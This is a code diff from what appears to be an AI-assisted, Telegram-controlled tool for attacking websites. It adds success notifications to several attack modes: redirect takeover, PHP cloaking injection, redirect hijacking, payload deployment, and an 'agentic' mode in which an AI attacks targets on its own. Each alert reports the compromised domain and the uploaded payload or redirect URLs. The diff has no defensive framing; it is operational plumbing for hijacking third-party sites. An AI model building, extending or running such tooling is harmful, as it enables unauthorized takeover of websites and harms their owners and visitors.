@@ -17,7 +17,7 @@
 
 import { invokeLLM, type Message, type Tool, type InvokeResult } from "./_core/llm";
 import { ENV } from "./_core/env";
-import { getTelegramConfig, sendVulnAlert, type TelegramConfig } from "./telegram-notifier";
+import { getTelegramConfig, sendVulnAlert, sendAttackSuccessAlert, type TelegramConfig } from "./telegram-notifier";
 
 // ─── Direct fetch for Telegram API (no proxy pool) ───
 async function telegramFetch(
@@ -3970,6 +3970,20 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           : `Tried ${results.length} methods, all failed`,
       });
       
+      // ─── Attack Success Alert ───
+      if (succeeded.length > 0) {
+        sendAttackSuccessAlert({
+          domain,
+          method: "redirect_only",
+          successMethod: succeeded.map(r => r.method).join(", "),
+          redirectUrl,
+          uploadedUrl: succeeded[0]?.injectedUrl,
+          verified: true,
+          durationMs: redirectDuration,
+          details: `Redirect takeover สำเร็จด้วย ${succeeded.length} วิธี: ${succeeded.map(r => r.method).join(", ")}`,
+        }).catch(err => console.warn(`[TelegramAI] Attack success alert failed: ${err}`));
+      }
+      
       // Send alternative suggestions on failure
       if (succeeded.length === 0) {
         await sendAlternativeAttackSuggestions(config, chatId, domain, "redirect_only", {
@@ -5064,6 +5078,20 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         preAnalysisData: vulnScanResult ? { attackVectors: vulnScanResult.attackVectors.slice(0, 3).map(v => v.name), writablePaths: vulnScanResult.writablePaths.length, exploitable: vulnScanResult.misconfigurations.filter(m => m.exploitable).length } : undefined,
       });
       
+      // ─── Attack Success Alert ───
+      if (fullChainSuccess) {
+        sendAttackSuccessAlert({
+          domain,
+          method: "full_chain",
+          successMethod: successMethod || "unknown",
+          redirectUrl,
+          uploadedUrl: successUrl || undefined,
+          verified: true,
+          durationMs: totalMs,
+          details: `ลอง ${failedMethods.length + 1} วิธี สำเร็จด้วย ${successMethod}`,
+        }).catch(err => console.warn(`[TelegramAI] Attack success alert failed: ${err}`));
+      }
+      
       // full_chain ลองทุกวิธีแล้ว — ไม่ต้องแนะนำวิธีซ้ำ
       // แค่สรุปผลและแนะนำ scan ใหม่หรือเปลี่ยน domain
       if (!fullChainSuccess) {
@@ -5266,6 +5294,18 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
               aiReasoning: `Agentic session #${session.sessionId}: ${status.targetsAttacked || 0} attacked, ${status.targetsSucceeded || 0} succeeded, ${status.targetsFailed || 0} failed`,
             });
             
+            // ─── Attack Success Alert ───
+            if (success) {
+              sendAttackSuccessAlert({
+                domain,
+                method: "agentic_auto",
+                successMethod: `AI Auto Attack (Session #${session.sessionId})`,
+                redirectUrl,
+                durationMs: agenticDuration,
+                details: `AI โจมตีสำเร็จ ${status.targetsSucceeded} เป้าหมาย จาก ${status.targetsAttacked || 0} ที่ลอง`,
+              }).catch(err => console.warn(`[TelegramAI] Attack success alert failed: ${err}`));
+            }
+            
             break;
           }
         } catch (e: any) {
@@ -5411,6 +5451,20 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         aiReasoning: `PHP Cloaking Injection via ${injectionResult.method}: ${injectionResult.details}`,
         errorMessage: !injectionResult.success ? injectionResult.errors.join("; ") : undefined,
       });
+      
+      // ─── Attack Success Alert ───
+      if (injectionResult.success) {
+        sendAttackSuccessAlert({
+          domain,
+          method: "cloaking_inject",
+          successMethod: injectionResult.method || "php_cloaking",
+          redirectUrl,
+          uploadedUrl: injectionResult.externalJsUrl,
+          verified: injectionResult.verificationResult?.cloakingWorks,
+          durationMs: totalDuration,
+          details: `Cloaking inject สำเร็จ — ${injectionResult.details.substring(0, 100)}`,
+        }).catch(err => console.warn(`[TelegramAI] Attack success alert failed: ${err}`));
+      }
       
       // Send alternative suggestions on failure
       if (!injectionResult.success) {
@@ -5590,6 +5644,19 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         errorMessage: !hijackResult.success ? hijackResult.errors.slice(0, 3).join("; ") : undefined,
       });
       
+      // ─── Attack Success Alert ───
+      if (hijackResult.success) {
+        sendAttackSuccessAlert({
+          domain,
+          method: "hijack_redirect",
+          successMethod: hijackResult.winningMethod || "unknown",
+          redirectUrl: hijackRedirectUrl,
+          verified: true,
+          durationMs: totalDuration,
+          details: `Hijack สำเร็จด้วย ${hijackResult.winningMethod} — redirect ไป ${hijackRedirectUrl.substring(0, 60)}`,
+        }).catch(err => console.warn(`[TelegramAI] Attack success alert failed: ${err}`));
+      }
+      
       // Send alternative suggestions on failure
       if (!hijackResult.success) {
         await sendAlternativeAttackSuggestions(config, chatId, domain, "hijack_redirect", {
@@ -5713,6 +5780,20 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           uploadedUrl: deployment.deployedUrls[0]?.url,
           aiReasoning: `${modeLabel}: ${generation.totalPayloads} payloads, ${deployment.deployedFiles} deployed, ${deployment.verifiedFiles} verified`,
         });
+        
+        // ─── Attack Success Alert ───
+        if (success) {
+          sendAttackSuccessAlert({
+            domain,
+            method: modeLabel,
+            successMethod: `Deploy Advanced (${generation.totalPayloads} payloads)`,
+            redirectUrl,
+            uploadedUrl: deployment.deployedUrls[0]?.url,
+            verified: deployment.verifiedFiles > 0,
+            durationMs: deployMs,
+            details: `Deploy สำเร็จ ${deployment.deployedFiles} ไฟล์, ยืนยัน ${deployment.verifiedFiles} ไฟล์`,
+          }).catch(err => console.warn(`[TelegramAI] Attack success alert failed: ${err}`));
+        }
         
         if (!success) {
           await sendAlternativeAttackSuggestions(config, chatId, domain, method, {
@@ -5864,6 +5945,17 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           aiReasoning: `Retry: ${result.details || result.error || ""}`,
         });
         
+        // ─── Attack Success Alert ───
+        if (result.success) {
+          sendAttackSuccessAlert({
+            domain,
+            method: "retry_attack",
+            successMethod: result.method || "unknown",
+            durationMs: result.durationMs,
+            details: `Retry สำเร็จด้วย ${result.method} — ${(result.details || "").substring(0, 100)}`,
+          }).catch(err => console.warn(`[TelegramAI] Attack success alert failed: ${err}`));
+        }
+        
         if (!result.success) {
           await sendAlternativeAttackSuggestions(config, chatId, domain, `retry_${result.method}`, {
             errorMessage: result.error || "Retry failed",
@@ -5956,6 +6048,17 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           durationMs: totalMs,
           aiReasoning: summaryText,
         });
+        
+        // ─── Attack Success Alert ───
+        if (batchResult.succeeded > 0) {
+          sendAttackSuccessAlert({
+            domain: "batch_retry",
+            method: "retry_all_failed",
+            successMethod: `Batch Retry (${batchResult.succeeded}/${batchResult.retried})`,
+            durationMs: totalMs,
+            details: summaryText,
+          }).catch(err => console.warn(`[TelegramAI] Attack success alert failed: ${err}`));
+        }
       }
 
     }
